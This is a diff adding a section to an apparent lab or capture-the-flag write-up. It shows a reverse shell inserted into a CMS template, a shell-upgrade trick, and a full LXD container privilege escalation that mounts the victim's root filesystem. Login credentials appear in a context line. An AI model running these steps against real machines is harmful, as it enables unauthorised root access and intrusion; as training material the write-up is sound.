@@ -99,5 +99,59 @@ admin:abcd1234
 
 ## RCE
 
+Add reverse shell to tempalte file
+
+![image](https://user-images.githubusercontent.com/5285547/134676145-80b8d04e-7532-414b-aaf7-fb022bc656dc.png)
+
+Then view template preview to active. 
+
+![image](https://user-images.githubusercontent.com/5285547/134676325-8df76263-2d3a-4e70-84b2-e8286e03c8a6.png)
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo;fg
+reset
+```
+
+```
+lxc image list  
++-------+--------------+--------+-------------+--------+--------+------------------------------+
+| ALIAS | FINGERPRINT  | PUBLIC | DESCRIPTION |  ARCH  |  SIZE  |         UPLOAD DATE          |
++-------+--------------+--------+-------------+--------+--------+------------------------------+
+|       | a8258f4a885f | no     |             | x86_64 | 2.39MB | Oct 25, 2019 at 8:07pm (UTC) |
++-------+--------------+--------+-------------+--------+--------+------------------------------+
+
+```
+
+```
+# build a simple alpine image
+git clone https://github.com/saghul/lxd-alpine-builder
+cd lxd-alpine-builder
+sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
+sudo ./build-alpine -a i686
+
+# copy to the box... 
+
+# import the image
+lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
+
+# before running the image, start and configure the lxd storage pool as default 
+lxd init
+
+# run the image
+lxc init myimage mycontainer -c security.privileged=true
+
+# mount the /root into the image
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+
+# interact with the container
+lxc start mycontainer
+lxc exec mycontainer /bin/sh
+```
+
+![image](https://user-images.githubusercontent.com/5285547/134677358-f6482879-df85-45f3-8d98-728d05033026.png)
+
+
+![image](https://user-images.githubusercontent.com/5285547/134677652-80204e01-4dc0-4011-b929-b121eadb6df9.png)
 
 
